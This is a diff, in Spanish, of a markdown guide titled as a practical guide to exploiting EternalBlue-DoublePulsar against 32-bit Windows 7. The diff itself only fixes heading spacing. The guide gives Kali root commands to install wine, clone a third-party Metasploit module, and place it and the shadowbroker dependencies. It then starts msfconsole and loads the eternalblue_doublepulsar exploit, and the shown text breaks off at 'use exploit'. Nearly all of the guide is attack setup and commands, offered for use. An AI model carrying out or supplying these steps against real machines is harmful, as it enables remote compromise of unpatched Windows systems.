@@ -1,21 +1,21 @@
-#Guía práctica para explotación de Eternalblue-DoublePulsar sobre Windows 7 - i386 
+# Guía práctica para explotación de Eternalblue-DoublePulsar sobre Windows 7 - i386 
 
-##Procedimiento
+## Procedimiento
 
-##Preparación de entorno
+## Preparación de entorno
 Se debe instalar el programa wine y agregar la arquitectura de 32bits al sistema, para esto ejecutaremos los pasos siguientes:
 
 - root@kali:~#  apt-get install wine -y
 - root@kali:~#  apt-get install winetricks -y
 - root@kali:~#  dpkg –add-architecture i386 && apt-get update && apt-get install wine32 -y
-##1) Instalación del módulo en Metasploit
+## 1) Instalación del módulo en Metasploit
 - Clonar el repositorio de Eternalblue-DoublePulsar 
 - root@kali:~#  git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
 - root@kali:~#  cd Eternalblue-Doublepulsar-Metasploit/
 - Copiar el archivo eternalblue_doublepulsar.rb a la siguiente dirección: /usr/share/metasploit-framework/modules/exploits/windows/smb/
 - Crear la estructura de directorios ‘/root/shadowbroker/windows/lib/x86-Windows/’ y copiar la carpeta deps en  ‘/root/shadowbroker/windows/lib/x86-Windows/’
 - Abrir una terminal y tipear el comando winecfg para que se cree la carpeta /root/.wine/drive_c/
-##2) Explotación    
+## 2) Explotación    
 - Abrir una terminal y iniciar metasploit con el comando msfconsole
 - Llamamos al exploit con el path exploit/windows/smb/eternalblue_doublepulsar
   - msf5 > use exploit    
